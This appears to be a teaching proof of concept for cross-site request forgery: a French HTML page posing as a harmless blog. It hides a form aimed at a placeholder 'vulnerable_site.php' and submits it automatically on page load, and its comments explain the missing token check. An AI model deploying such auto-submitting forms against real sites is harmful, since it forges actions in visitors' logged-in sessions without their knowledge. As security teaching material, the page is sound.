<!DOCTYPE html>
<html lang="fr">
<head>
    <title>Site Malveillant</title>
</head>
<body>
    <h1>Ce site pourrait être un blog innocent avec un contenu trompeur.</h1>

    <!-- Le formulaire ci-dessous est automatiquement soumis par le script JavaScript quand la page se charge -->
    <form id="malicious-form" action="vulnerable_site.php" method="post" style="display:none;">
        <input type="hidden" name="message" value="Message forgé via CSRF">
        <!-- Le site vulnérable ne vérifie pas l'existence d'un token CSRF, donc aucune valeur n'est nécessaire ici -->
    </form>

    <script>
        // Lorsque le document est chargé, le formulaire malveillant est automatiquement soumis
        window.onload = function() {
            document.getElementById('malicious-form').submit();
        };
    </script>
</body>
</html>
